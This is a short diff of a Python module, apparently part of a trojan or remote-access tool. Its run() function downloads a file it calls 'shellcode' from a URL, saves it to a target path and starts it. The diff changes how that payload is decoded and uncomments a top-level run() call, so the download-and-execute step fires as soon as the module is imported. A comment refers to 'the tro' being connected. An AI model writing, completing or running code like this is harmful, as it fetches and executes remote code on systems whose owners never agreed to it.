@@ -47,6 +47,7 @@ def run(**args):
 
   try:
     http = urllib3.PoolManager()
+    #The HTTPResponse object provides status, data, and header attributes:
     r = http.request('GET', url)
   except urllib3.exceptions.MaxRetryError:
   	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
@@ -54,9 +55,10 @@ def run(**args):
   except urllib3.exceptions.URLError:
   	#os.system("echo '<urlopen error [Errno 111] Connection refused>' >> .Tlog.log")
   	return "getFileFromURI: Connection refused"
-  # decode the shellcode from base64
 
-  shellcode = str(r.data) #.decode("utf-8")  ####shellcode = base64.b64decode(r.data)
+
+  shellcode = r.data.decode("utf-8")
+  #The data attribute of the response is always set to a byte string representing the response content
   cmd = ""
 
   if bin:
@@ -82,7 +84,7 @@ def run(**args):
   return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
 
 
-#run()
+run()
   #while not is_connected(): #if the tro execute this, so it is already connected
   #time.sleep(20)
 import socket
